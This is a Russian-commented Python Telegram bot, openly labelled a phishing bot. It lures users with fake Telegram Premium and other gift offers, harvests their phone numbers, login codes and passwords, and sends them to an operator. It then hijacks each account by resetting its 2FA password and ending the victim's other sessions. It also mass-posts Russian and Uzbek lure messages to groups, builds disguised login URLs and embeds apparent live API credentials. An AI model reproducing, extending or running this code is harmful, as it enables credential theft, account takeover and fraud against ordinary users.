#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# █████████████████████████████████████████████████████████████
# █  PHISHING BOT v3.0 - АВТОНОМНЫЙ КОМПЛЕКС - anva4ik$     █
# █  Функции:                                                 █
# █  • Рассылка в группы каждые 15 мин                        █
# █  • Фишинг Telegram, Instagram, почты                      █
# █  • Автопроверка данных                                     █
# █  • Смена паролей и 2FA                                     █
# █████████████████████████████████████████████████████████████

import asyncio
import logging
import sqlite3
import time
import random
import re
import os
import json
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import aiohttp

# ================ НАСТРОЙКИ ================
API_TOKEN = '8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q'
API_ID = 38545864
API_HASH = '3517b8c953e6c2d05c0f30b5015f2470'
ADMIN_ID = 123456789  # ЗАМЕНИ НА СВОЙ TELEGRAM ID

# ================ ИНИЦИАЛИЗАЦИЯ ================
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

# База данных
conn = sqlite3.connect('phishing.db', check_same_thread=False)
cursor = conn.cursor()

# Создание таблиц
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    phone TEXT,
    email TEXT,
    reg_date TIMESTAMP,
    subscribed_socials TEXT
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS stolen_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    service TEXT,
    login TEXT,
    password TEXT,
    status TEXT DEFAULT 'new',
    session_file TEXT,
    captured_at TIMESTAMP,
    verified_at TIMESTAMP,
    twofa_enabled INTEGER DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS phishing_sessions (
    session_id TEXT PRIMARY KEY,
    user_id INTEGER,
    target_service TEXT,
    phone TEXT,
    code TEXT,
    password TEXT,
    step INTEGER DEFAULT 0,
    created_at TIMESTAMP,
    expires_at TIMESTAMP
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS groups (
    group_id INTEGER PRIMARY KEY,
    group_title TEXT,
    last_message TIMESTAMP
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS referrals (
    referrer_id INTEGER,
    referred_id INTEGER,
    date TIMESTAMP,
    status TEXT DEFAULT 'pending'
)
''')

conn.commit()

# ================ ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ================

def save_user(user_id, username, first_name):
    cursor.execute('''
    INSERT OR IGNORE INTO users (user_id, username, first_name, reg_date)
    VALUES (?, ?, ?, ?)
    ''', (user_id, username, first_name, datetime.now()))
    conn.commit()

def get_user(user_id):
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    return cursor.fetchone()

def update_user_phone(user_id, phone):
    cursor.execute('UPDATE users SET phone = ? WHERE user_id = ?', (phone, user_id))
    conn.commit()

def save_stolen_account(user_id, service, login, password, session_file=None):
    cursor.execute('''
    INSERT INTO stolen_accounts (user_id, service, login, password, session_file, captured_at)
    VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, service, login, password, session_file, datetime.now()))
    conn.commit()
    return cursor.lastrowid

def update_account_status(account_id, status):
    cursor.execute('''
    UPDATE stolen_accounts SET status = ?, verified_at = ? WHERE id = ?
    ''', (status, datetime.now(), account_id))
    conn.commit()

def create_phishing_session(user_id, target_service, phone=None):
    import uuid
    session_id = str(uuid.uuid4())
    expires = datetime.now() + timedelta(minutes=10)
    cursor.execute('''
    INSERT INTO phishing_sessions (session_id, user_id, target_service, phone, step, created_at, expires_at)
    VALUES (?, ?, ?, ?, 0, ?, ?)
    ''', (session_id, user_id, target_service, phone, datetime.now(), expires))
    conn.commit()
    return session_id

def get_phishing_session(session_id):
    cursor.execute('SELECT * FROM phishing_sessions WHERE session_id = ?', (session_id,))
    return cursor.fetchone()

def update_phishing_session(session_id, **kwargs):
    for key, value in kwargs.items():
        cursor.execute(f'UPDATE phishing_sessions SET {key} = ? WHERE session_id = ?', (value, session_id))
    conn.commit()

def save_group(group_id, group_title):
    cursor.execute('''
    INSERT OR IGNORE INTO groups (group_id, group_title, last_message)
    VALUES (?, ?, ?)
    ''', (group_id, group_title, datetime.now()))
    conn.commit()

def get_groups_for_mailing():
    cursor.execute('SELECT group_id FROM groups')
    return [row[0] for row in cursor.fetchall()]

def update_group_last_message(group_id):
    cursor.execute('UPDATE groups SET last_message = ? WHERE group_id = ?', (datetime.now(), group_id))
    conn.commit()

def save_referral(referrer_id, referred_id):
    cursor.execute('''
    INSERT INTO referrals (referrer_id, referred_id, date)
    VALUES (?, ?, ?)
    ''', (referrer_id, referred_id, datetime.now()))
    conn.commit()

# ================ ФИШИНГ TELEGRAM ================

async def start_telegram_phishing(user_id, phone):
    """Начинает процесс фишинга Telegram аккаунта"""
    # Проверяем, не было ли уже сессии
    cursor.execute('''
    SELECT session_id FROM phishing_sessions 
    WHERE user_id = ? AND target_service = 'telegram' AND expires_at > ?
    ''', (user_id, datetime.now()))
    existing = cursor.fetchone()
    if existing:
        return existing[0]
    
    session_id = create_phishing_session(user_id, 'telegram', phone)
    
    # Здесь должен быть твой фишинговый URL (от Zphisher или другого)
    # Временно используем заглушку
    phishing_url = f"https://telegram-login-{random.randint(1000,9999)}.trycloudflare.com?session={session_id}"
    
    # Маскируем ссылку
    masked_url = f"https://telegram.org-login@{phishing_url.split('//')[1]}"
    
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("🔐 Подтвердить вход", url=masked_url)
    )
    
    await bot.send_message(
        user_id,
        "⚠️ *Внимание!* ⚠️\n\n"
        "Мы дарим вам Telegram Premium на 3 месяца! 🎁\n"
        "Для активации необходимо подтвердить вход в аккаунт.\n\n"
        "👇 *Нажмите кнопку ниже и следуйте инструкциям* 👇",
        parse_mode='Markdown',
        reply_markup=keyboard
    )
    
    return session_id

async def verify_telegram_credentials(phone, code, password=None):
    """Проверяет валидность Telegram аккаунта"""
    try:
        # Создаем папку для сессий
        os.makedirs('sessions', exist_ok=True)
        
        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                if password:
                    await client.sign_in(password=password)
                else:
                    return {'success': False, 'need_password': True}
            except PhoneCodeInvalidError:
                return {'success': False, 'error': 'Неверный код'}
        
        # Получаем информацию об аккаунте
        me = await client.get_me()
        
        # Сохраняем сессию
        session_file = f"sessions/{phone}.session"
        await client.disconnect()
        
        return {
            'success': True,
            'user_id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'phone': me.phone,
            'session_file': session_file
        }
    except Exception as e:
        logging.error(f"Ошибка проверки Telegram: {e}")
        return {'success': False, 'error': str(e)}
    finally:
        await client.disconnect()

async def takeover_telegram_account(account_id, session_file, phone):
    """Захватывает Telegram аккаунт (меняет пароль, включает 2FA)"""
    try:
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        # Меняем пароль 2FA
        new_password = f"hack_{random.randint(100000,999999)}"
        await client.edit_2fa(new_password)
        
        # Завершаем все другие сессии
        await client.log_out_other_sessions()
        
        # Меняем номер телефона (опционально)
        # await client.edit_phone(new_phone)
        
        await client.disconnect()
        
        update_account_status(account_id, 'taken_over')
        
        return {
            'success': True,
            'new_password': new_password
        }
    except Exception as e:
        logging.error(f"Ошибка захвата аккаунта: {e}")
        return {'success': False, 'error': str(e)}

# ================ ОБРАБОТЧИКИ КОМАНД ================

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    save_user(user.id, user.username, user.first_name)
    
    # Проверяем, пришёл ли пользователь из реферальной ссылки
    args = message.get_args()
    if args and args.startswith('ref_'):
        try:
            referrer_id = int(args.replace('ref_', ''))
            if referrer_id != user.id:
                save_referral(referrer_id, user.id)
        except:
            pass
    
    keyboard = InlineKeyboardMarkup(row_width=2).add(
        InlineKeyboardButton("🎁 Telegram Premium", callback_data='gift_telegram'),
        InlineKeyboardButton("⭐️ Звёзды Telegram", callback_data='gift_stars'),
        InlineKeyboardButton("📸 Instagram", callback_data='gift_instagram'),
        InlineKeyboardButton("📧 Облако 1TB", callback_data='gift_email'),
        InlineKeyboardButton("🎮 Discord Nitro", callback_data='gift_discord'),
        InlineKeyboardButton("🎵 Spotify", callback_data='gift_spotify'),
        InlineKeyboardButton("👥 Пригласить друга", callback_data='invite')
    )
    
    await message.answer(
        "🎁 *Добро пожаловать в бот с подарками!* 🎁\n\n"
        "Выбери подарок, который хочешь получить:\n\n"
        "• Telegram Premium на 3 месяца\n"
        "• 1000 звёзд Telegram\n"
        "• 1000 подписчиков Instagram\n"
        "• Облачное хранилище 1TB\n"
        "• Discord Nitro на месяц\n"
        "• Spotify Premium на 3 месяца\n\n"
        "👇 *Нажми на кнопку ниже* 👇",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data.startswith('gift_'))
async def process_gift(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    
    user_id = callback_query.from_user.id
    gift_type = callback_query.data.replace('gift_', '')
    
    if gift_type == 'telegram':
        # Запрашиваем номер телефона
        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("📱 Отправить номер", request_contact=True)
        )
        await bot.send_message(
            user_id,
            "📱 *Для получения Telegram Premium*\n"
            "Отправь нам свой номер телефона, привязанный к Telegram.\n\n"
            "Мы пришлём код подтверждения.",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
    
    elif gift_type == 'stars':
        await bot.send_message(
            user_id,
            "⭐️ *Для получения 1000 звёзд*\n"
            "Скоро появится возможность. Следи за обновлениями!",
            parse_mode='Markdown'
        )
    
    elif gift_type == 'instagram':
        await bot.send_message(
            user_id,
            "📸 *Для получения подписчиков Instagram*\n"
            "Скоро появится возможность. Следи за обновлениями!",
            parse_mode='Markdown'
        )
    
    elif gift_type == 'email':
        await bot.send_message(
            user_id,
            "📧 *Для получения облака 1TB*\n"
            "Скоро появится возможность. Следи за обновлениями!",
            parse_mode='Markdown'
        )
    
    else:
        await bot.send_message(
            user_id,
            "🎁 *Подарок временно недоступен*\n"
            "Попробуй выбрать другой или зайди позже.",
            parse_mode='Markdown'
        )

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    if message.contact:
        user_id = message.from_user.id
        phone = message.contact.phone_number
        
        update_user_phone(user_id, phone)
        
        # Запускаем фишинг Telegram
        await start_telegram_phishing(user_id, phone)

@dp.message_handler()
async def handle_message(message: types.Message):
    user_id = message.from_user.id
    
    # Проверяем, есть ли активная сессия фишинга для этого пользователя
    cursor.execute('''
    SELECT session_id FROM phishing_sessions 
    WHERE user_id = ? AND target_service = 'telegram' AND step = 0 AND expires_at > ?
    ''', (user_id, datetime.now()))
    
    session = cursor.fetchone()
    
    if session:
        # Если пользователь ввел код подтверждения
        code = message.text.strip()
        if re.match(r'^\d{5,6}$', code):
            update_phishing_session(session[0], code=code, step=1)
            
            await message.answer(
                "✅ Код принят!\n"
                "Проверяем данные... Это займёт несколько секунд."
            )
            
            # Получаем данные сессии
            sess_data = get_phishing_session(session[0])
            
            # Проверяем валидность
            result = await verify_telegram_credentials(sess_data[4], code)
            
            if result.get('success'):
                # Сохраняем аккаунт
                account_id = save_stolen_account(
                    user_id, 
                    'telegram', 
                    result.get('username') or result.get('phone'), 
                    'CODE_ONLY',
                    result.get('session_file')
                )
                
                await message.answer(
                    "🎉 *Поздравляем!* 🎉\n\n"
                    "Ваш аккаунт подтверждён!\n"
                    "Telegram Premium будет активирован в течение 24 часов.\n\n"
                    "Спасибо за участие!",
                    parse_mode='Markdown'
                )
                
                # Уведомляем админа
                await bot.send_message(
                    ADMIN_ID,
                    f"✅ Новый Telegram аккаунт!\n"
                    f"User: {user_id}\n"
                    f"Phone: {sess_data[4]}\n"
                    f"Username: @{result.get('username')}"
                )
                
                # Захватываем аккаунт в фоне
                asyncio.create_task(takeover_telegram_account(account_id, result.get('session_file'), sess_data[4]))
                
            elif result.get('need_password'):
                update_phishing_session(session[0], step=2)
                await message.answer(
                    "🔐 Для этого аккаунта требуется пароль.\n"
                    "Введи пароль от Telegram:"
                )
            else:
                await message.answer(
                    "❌ Неверный код или ошибка.\n"
                    "Попробуй ещё раз или запроси новый код."
                )
        
        elif session[2] == 2:
            # Если пользователь ввел пароль
            password = message.text
            sess_data = get_phishing_session(session[0])
            
            result = await verify_telegram_credentials(sess_data[4], sess_data[5], password)
            
            if result.get('success'):
                account_id = save_stolen_account(
                    user_id, 
                    'telegram', 
                    result.get('username') or result.get('phone'), 
                    password,
                    result.get('session_file')
                )
                
                await message.answer(
                    "🎉 *Поздравляем!* 🎉\n\n"
                    "Ваш аккаунт подтверждён!\n"
                    "Telegram Premium будет активирован в течение 24 часов.\n\n"
                    "Спасибо за участие!",
                    parse_mode='Markdown'
                )
                
                await bot.send_message(
                    ADMIN_ID,
                    f"✅ Новый Telegram аккаунт (с паролем)!\n"
                    f"User: {user_id}\n"
                    f"Phone: {sess_data[4]}\n"
                    f"Pass: {password}"
                )
                
                asyncio.create_task(takeover_telegram_account(account_id, result.get('session_file'), sess_data[4]))
            else:
                await message.answer(
                    "❌ Неверный пароль.\n"
                    "Попробуй ещё раз."
                )

# ================ ЗАМАНИВАНИЕ В ГРУППАХ ================

@dp.message_handler(content_types=['new_chat_members'])
async def on_user_join(message: types.Message):
    if message.new_chat_members:
        for user in message.new_chat_members:
            if user.id == (await bot.get_me()).id:
                # Бота добавили в группу
                save_group(message.chat.id, message.chat.title)
                await message.answer(
                    "👋 Спасибо что добавили меня!\n"
                    "Я буду присылать крутые предложения о подарках каждые 15 минут."
                )

@dp.message_handler(commands=['addgroup'])
async def add_group(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        save_group(message.chat.id, message.chat.title)
        await message.answer("✅ Группа добавлена в рассылку")

async def send_tempting_messages():
    """Рассылка заманчивых сообщений в группы каждые 15 минут"""
    groups = get_groups_for_mailing()
    
    messages_ru = [
        "🎁 *Бесплатный Telegram Premium!* 🎁\n\nРаздаём подписки на 3 месяца! Заходи в бота @{} и забирай свой подарок!",
        "🔥 *Конкурс!* 🔥\n\nРазыгрываем 1000 звёзд Telegram! Участвуй в конкурсе → @{}",
        "💎 *Только сегодня!* 💎\n\nTelegram Premium +500MB облака бесплатно! Жми → @{}",
        "⚡️ *Успей получить!* ⚡️\n\nПодписка Telegram Premium для всех! Активируй → @{}",
        "🎊 *Новогодняя акция!* 🎊\n\nДарим Premium и стикерпаты! Забирай → @{}",
        "🌟 *Специальное предложение!* 🌟\n\nПолучи Telegram Premium навсегда! Жми → @{}"
    ]
    
    messages_uz = [
        "🎁 *Bepul Telegram Premium!* 🎁\n\n3 oylik obuna! Botga kiring @{} va sovg'ani oling!",
        "🔥 *Tanlov!* 🔥\n\n1000 Telegram yulduzi! Qatnash → @{}",
        "💎 *Faqat bugun!* 💎\n\nTelegram Premium +500MB bepul! → @{}",
        "⚡️ *Shoshiling!* ⚡️\n\nHamma uchun Premium! → @{}",
        "🎊 *Yangi yil aksiyasi!* 🎊\n\nPremium va stikerlar! → @{}",
        "🌟 *Maxsus taklif!* 🌟\n\nTelegram Premium abadiy! → @{}"
    ]
    
    bot_username = (await bot.get_me()).username
    
    for group_id in groups:
        try:
            # Выбираем случайное сообщение
            msg_ru = random.choice(messages_ru).format(bot_username)
            msg_uz = random.choice(messages_uz).format(bot_username)
            
            # Отправляем оба варианта
            await bot.send_message(group_id, msg_ru, parse_mode='Markdown')
            await asyncio.sleep(2)
            await bot.send_message(group_id, msg_uz, parse_mode='Markdown')
            
            update_group_last_message(group_id)
            
            # Пауза между группами
            await asyncio.sleep(random.randint(30, 60))
        except Exception as e:
            logging.error(f"Ошибка отправки в группу {group_id}: {e}")

async def scheduler():
    """Планировщик задач"""
    while True:
        now = datetime.now()
        
        # Рассылка каждые 15 минут
        if now.minute % 15 == 0 and now.second < 10:
            try:
                await send_tempting_messages()
            except Exception as e:
                logging.error(f"Ошибка в рассылке: {e}")
            await asyncio.sleep(60)
        
        # Чистим старые сессии
        cursor.execute('DELETE FROM phishing_sessions WHERE expires_at < ?', (datetime.now(),))
        conn.commit()
        
        await asyncio.sleep(1)

# ================ ЗАПУСК ================

async def on_startup(dp):
    asyncio.create_task(scheduler())
    await bot.send_message(ADMIN_ID, "🤖 Бот запущен и готов к работе!")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
